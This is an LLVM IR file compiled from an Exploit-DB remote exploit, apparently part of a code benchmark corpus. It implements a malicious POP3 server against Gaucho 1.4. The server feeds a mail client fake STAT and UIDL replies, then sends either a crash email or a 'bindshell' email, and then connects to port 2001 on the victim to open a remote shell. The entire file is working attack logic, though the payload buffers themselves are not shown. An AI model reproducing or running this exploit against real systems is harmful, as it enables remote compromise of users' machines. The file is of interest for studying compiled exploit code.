; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_421.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_421.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32 }

@.str = private unnamed_addr constant [63 x i8] c"Proof-of-Concept POP3 server for Gaucho Ver 1.4 Vulnerabilityn\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"nINVALID MODE!n\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"Cannot start Winsock!n\00", align 1
@INVALID_SOCKET = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [33 x i8] c"Cannot create listening socket!n\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"Listening on POP3 port 110...n\00", align 1
@OK_MSG = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@STAT_REPLY = common dso_local global i8* null, align 8
@UIDL_REPLY = common dso_local global i8* null, align 8
@pocEmail = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [25 x i8] c"POC crash email sent...n\00", align 1
@bindShellEmail = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [51 x i8] c"Bindshell email sent.   Sleeping for 2 seconds...n\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [41 x i8] c"Invalid socket return in socket() call.n\00", align 1
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [54 x i8] c"Exploit Failed. SOCKET_ERROR return in connect call.n\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca [1024 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @printUsage(i8* %20)
  store i32 1, i32* %3, align 4
  br label %224

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  store i32 %26, i32* %6, align 4
  %27 = load i32, i32* %6, align 4
  %28 = icmp ne i32 %27, 1
  br i1 %28, label %29, label %38

29:                                               ; preds = %22
  %30 = load i32, i32* %6, align 4
  %31 = icmp ne i32 %30, 2
  br i1 %31, label %32, label %38

32:                                               ; preds = %29
  %33 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @printUsage(i8* %36)
  store i32 1, i32* %3, align 4
  br label %224

38:                                               ; preds = %29, %22
  %39 = call i32 (...) @tcpInit()
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %43, label %41

41:                                               ; preds = %38
  %42 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %224

43:                                               ; preds = %38
  %44 = call i64 @tcpListen(i32 110)
  store i64 %44, i64* %7, align 8
  %45 = load i64, i64* %7, align 8
  %46 = load i64, i64* @INVALID_SOCKET, align 8
  %47 = icmp eq i64 %45, %46
  br i1 %47, label %48, label %50

48:                                               ; preds = %43
  %49 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %224

50:                                               ; preds = %43
  %51 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0))
  store i32 8, i32* %9, align 4
  %52 = load i64, i64* %7, align 8
  %53 = bitcast %struct.sockaddr_in* %8 to i32*
  %54 = call i64 @WSAAccept(i64 %52, i32* %53, i32* %9, i32* null, i32 0)
  store i64 %54, i64* %10, align 8
  %55 = load i64, i64* %10, align 8
  %56 = load i64, i64* @INVALID_SOCKET, align 8
  %57 = icmp ne i64 %55, %56
  br i1 %57, label %58, label %223

58:                                               ; preds = %50
  %59 = load i64, i64* %10, align 8
  %60 = load i8*, i8** @OK_MSG, align 8
  %61 = load i8*, i8** @OK_MSG, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = call i32 @send(i64 %59, i8* %60, i32 %62, i32 0)
  %64 = load i64, i64* %10, align 8
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %66 = call i32 @recv(i64 %64, i8* %65, i32 1024, i32 0)
  store i32 %66, i32* %12, align 4
  %67 = load i32, i32* %12, align 4
  %68 = icmp sle i32 %67, 0
  br i1 %68, label %69, label %70

69:                                               ; preds = %58
  store i32 1, i32* %3, align 4
  br label %224

70:                                               ; preds = %58
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %72 = load i32, i32* %12, align 4
  %73 = load i32, i32* @stdout, align 4
  %74 = call i32 @fwrite(i8* %71, i32 %72, i32 1, i32 %73)
  %75 = load i64, i64* %10, align 8
  %76 = load i8*, i8** @OK_MSG, align 8
  %77 = load i8*, i8** @OK_MSG, align 8
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @send(i64 %75, i8* %76, i32 %78, i32 0)
  %80 = load i64, i64* %10, align 8
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %82 = call i32 @recv(i64 %80, i8* %81, i32 1024, i32 0)
  store i32 %82, i32* %12, align 4
  %83 = load i32, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  br i1 %84, label %85, label %86

85:                                               ; preds = %70
  store i32 1, i32* %3, align 4
  br label %224

86:                                               ; preds = %70
  %87 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %88 = load i32, i32* %12, align 4
  %89 = load i32, i32* @stdout, align 4
  %90 = call i32 @fwrite(i8* %87, i32 %88, i32 1, i32 %89)
  %91 = load i64, i64* %10, align 8
  %92 = load i8*, i8** @OK_MSG, align 8
  %93 = load i8*, i8** @OK_MSG, align 8
  %94 = call i32 @strlen(i8* %93)
  %95 = call i32 @send(i64 %91, i8* %92, i32 %94, i32 0)
  %96 = load i64, i64* %10, align 8
  %97 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %98 = call i32 @recv(i64 %96, i8* %97, i32 1024, i32 0)
  store i32 %98, i32* %12, align 4
  %99 = load i32, i32* %12, align 4
  %100 = icmp sle i32 %99, 0
  br i1 %100, label %101, label %102

101:                                              ; preds = %86
  store i32 1, i32* %3, align 4
  br label %224

102:                                              ; preds = %86
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %104 = load i32, i32* %12, align 4
  %105 = load i32, i32* @stdout, align 4
  %106 = call i32 @fwrite(i8* %103, i32 %104, i32 1, i32 %105)
  %107 = load i64, i64* %10, align 8
  %108 = load i8*, i8** @STAT_REPLY, align 8
  %109 = load i8*, i8** @STAT_REPLY, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = call i32 @send(i64 %107, i8* %108, i32 %110, i32 0)
  %112 = load i64, i64* %10, align 8
  %113 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %114 = call i32 @recv(i64 %112, i8* %113, i32 1024, i32 0)
  store i32 %114, i32* %12, align 4
  %115 = load i32, i32* %12, align 4
  %116 = icmp sle i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %102
  store i32 1, i32* %3, align 4
  br label %224

118:                                              ; preds = %102
  %119 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %120 = load i32, i32* %12, align 4
  %121 = load i32, i32* @stdout, align 4
  %122 = call i32 @fwrite(i8* %119, i32 %120, i32 1, i32 %121)
  %123 = load i8*, i8** @UIDL_REPLY, align 8
  %124 = call i32 @genUIDLreply(i8* %123)
  %125 = load i64, i64* %10, align 8
  %126 = load i8*, i8** @STAT_REPLY, align 8
  %127 = load i8*, i8** @STAT_REPLY, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = call i32 @send(i64 %125, i8* %126, i32 %128, i32 0)
  %130 = load i64, i64* %10, align 8
  %131 = load i8*, i8** @UIDL_REPLY, align 8
  %132 = load i8*, i8** @UIDL_REPLY, align 8
  %133 = call i32 @strlen(i8* %132)
  %134 = call i32 @send(i64 %130, i8* %131, i32 %133, i32 0)
  %135 = load i64, i64* %10, align 8
  %136 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %137 = call i32 @recv(i64 %135, i8* %136, i32 1024, i32 0)
  store i32 %137, i32* %12, align 4
  %138 = load i32, i32* %12, align 4
  %139 = icmp sle i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %118
  store i32 1, i32* %3, align 4
  br label %224

141:                                              ; preds = %118
  %142 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %143 = load i32, i32* %12, align 4
  %144 = load i32, i32* @stdout, align 4
  %145 = call i32 @fwrite(i8* %142, i32 %143, i32 1, i32 %144)
  %146 = load i64, i64* %10, align 8
  %147 = load i8*, i8** @STAT_REPLY, align 8
  %148 = load i8*, i8** @STAT_REPLY, align 8
  %149 = call i32 @strlen(i8* %148)
  %150 = call i32 @send(i64 %146, i8* %147, i32 %149, i32 0)
  %151 = load i64, i64* %10, align 8
  %152 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %153 = call i32 @recv(i64 %151, i8* %152, i32 1024, i32 0)
  store i32 %153, i32* %12, align 4
  %154 = load i32, i32* %12, align 4
  %155 = icmp sle i32 %154, 0
  br i1 %155, label %156, label %157

156:                                              ; preds = %141
  store i32 1, i32* %3, align 4
  br label %224

157:                                              ; preds = %141
  %158 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %159 = load i32, i32* %12, align 4
  %160 = load i32, i32* @stdout, align 4
  %161 = call i32 @fwrite(i8* %158, i32 %159, i32 1, i32 %160)
  %162 = load i32, i32* %6, align 4
  %163 = icmp eq i32 %162, 1
  br i1 %163, label %164, label %184

164:                                              ; preds = %157
  %165 = load i64, i64* %10, align 8
  %166 = load i64, i64* @pocEmail, align 8
  %167 = inttoptr i64 %166 to i8*
  %168 = load i64, i64* @pocEmail, align 8
  %169 = inttoptr i64 %168 to i8*
  %170 = call i32 @strlen(i8* %169)
  %171 = call i32 @send(i64 %165, i8* %167, i32 %170, i32 0)
  %172 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  %173 = load i64, i64* %10, align 8
  %174 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %175 = call i32 @recv(i64 %173, i8* %174, i32 1024, i32 0)
  store i32 %175, i32* %12, align 4
  %176 = load i32, i32* %12, align 4
  %177 = icmp sle i32 %176, 0
  br i1 %177, label %178, label %179

178:                                              ; preds = %164
  store i32 1, i32* %3, align 4
  br label %224

179:                                              ; preds = %164
  %180 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %181 = load i32, i32* %12, align 4
  %182 = load i32, i32* @stdout, align 4
  %183 = call i32 @fwrite(i8* %180, i32 %181, i32 1, i32 %182)
  br label %222

184:                                              ; preds = %157
  %185 = load i64, i64* %10, align 8
  %186 = load i64, i64* @bindShellEmail, align 8
  %187 = inttoptr i64 %186 to i8*
  %188 = load i64, i64* @bindShellEmail, align 8
  %189 = inttoptr i64 %188 to i8*
  %190 = call i32 @strlen(i8* %189)
  %191 = call i32 @send(i64 %185, i8* %187, i32 %190, i32 0)
  %192 = call i32 @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.6, i64 0, i64 0))
  %193 = call i32 @Sleep(i32 2000)
  %194 = load i32, i32* @AF_INET, align 4
  %195 = load i32, i32* @SOCK_STREAM, align 4
  %196 = call i64 @socket(i32 %194, i32 %195, i32 0)
  store i64 %196, i64* %13, align 8
  %197 = load i64, i64* %13, align 8
  %198 = load i64, i64* @INVALID_SOCKET, align 8
  %199 = icmp eq i64 %197, %198
  br i1 %199, label %200, label %203

200:                                              ; preds = %184
  %201 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0))
  %202 = call i32 (...) @WSACleanup()
  store i32 -1, i32* %3, align 4
  br label %224

203:                                              ; preds = %184
  %204 = load i32, i32* @AF_INET, align 4
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %204, i32* %205, align 4
  %206 = call i32 @htons(i32 2001)
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %206, i32* %207, align 4
  %208 = load i64, i64* %13, align 8
  %209 = bitcast %struct.sockaddr_in* %8 to i32*
  %210 = call i64 @connect(i64 %208, i32* %209, i32 8)
  %211 = load i64, i64* @SOCKET_ERROR, align 8
  %212 = icmp eq i64 %210, %211
  br i1 %212, label %213, label %218

213:                                              ; preds = %203
  %214 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.8, i64 0, i64 0))
  %215 = load i64, i64* %13, align 8
  %216 = call i32 @closesocket(i64 %215)
  %217 = call i32 (...) @WSACleanup()
  store i32 -1, i32* %3, align 4
  br label %224

218:                                              ; preds = %203
  %219 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %220 = load i64, i64* %13, align 8
  %221 = call i32 @shell(i64 %220)
  br label %222

222:                                              ; preds = %218, %179
  br label %223

223:                                              ; preds = %222, %50
  store i32 0, i32* %3, align 4
  br label %224

224:                                              ; preds = %223, %213, %200, %178, %156, %140, %117, %101, %85, %69, %48, %41, %32, %17
  %225 = load i32, i32* %3, align 4
  ret i32 %225
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @printUsage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @tcpInit(...) #1

declare dso_local i64 @tcpListen(i32) #1

declare dso_local i64 @WSAAccept(i64, i32*, i32*, i32*, i32) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32) #1

declare dso_local i32 @genUIDLreply(i8*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @connect(i64, i32*, i32) #1

declare dso_local i32 @closesocket(i64) #1

declare dso_local i32 @shell(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
